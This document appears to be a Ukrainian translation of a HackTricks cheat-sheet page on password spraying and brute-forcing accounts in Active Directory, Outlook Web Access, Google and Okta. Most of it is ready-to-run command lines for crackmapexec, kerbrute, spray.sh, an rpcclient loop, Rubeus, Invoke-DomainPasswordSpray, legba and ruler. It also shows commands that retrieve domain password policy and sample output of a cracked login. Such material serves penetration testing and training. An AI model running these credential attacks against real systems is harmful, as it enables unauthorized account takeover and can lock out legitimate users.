# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

Поглибте свої знання в **Mobile Security** з 8kSec Academy. Опануйте безпеку iOS та Android через наші курси з самостійним навчанням та отримайте сертифікат:

{% embed url="https://academy.8ksec.io/" %}

## **Password Spraying**

Якщо ви знайшли кілька **дійсних імен користувачів**, ви можете спробувати найпоширеніші **паролі** (пам'ятайте про політику паролів у середовищі) для кожного з виявлених користувачів.\
За **замовчуванням** **мінімальна** **довжина** **пароля** становить **7**.

Списки поширених імен користувачів також можуть бути корисними: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Зверніть увагу, що ви **можете заблокувати деякі облікові записи, якщо спробуєте кілька неправильних паролів** (за замовчуванням більше 10).

### Отримати політику паролів

Якщо у вас є облікові дані користувача або оболонка як доменний користувач, ви можете **отримати політику паролів за допомогою**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Експлуатація з Linux (або всіх)

- Використовуючи **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Використовуючи [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(ви можете вказати кількість спроб, щоб уникнути блокувань):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Використовуючи [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - НЕ РЕКОМЕНДОВАНО, ІНОДІ НЕ ПРАЦЮЄ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- З модулем `scanner/smb/smb_login` **Metasploit**:

![](<../../images/image (745).png>)

- Використовуючи **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### З Windows

- З версією [Rubeus](https://github.com/Zer1t0/Rubeus) з модулем брутфорсу:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- З [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Він може за замовчуванням генерувати користувачів з домену та отримувати політику паролів з домену, обмежуючи спроби відповідно до неї):
```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- З [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Брутфорс
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
## Outlook Web Access

Існує кілька інструментів для p**assword spraying outlook**.

- З [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- з [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- З [Ruler](https://github.com/sensepost/ruler) (надійний!)
- З [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- З [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Щоб використовувати будь-який з цих інструментів, вам потрібен список користувачів і пароль / невеликий список паролів для спрею.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

Поглибте свої знання в **Mobile Security** з 8kSec Academy. Опануйте безпеку iOS та Android через наші курси з самостійним навчанням та отримайте сертифікат:

{% embed url="https://academy.8ksec.io/" %}

{{#include ../../banners/hacktricks-training.md}}
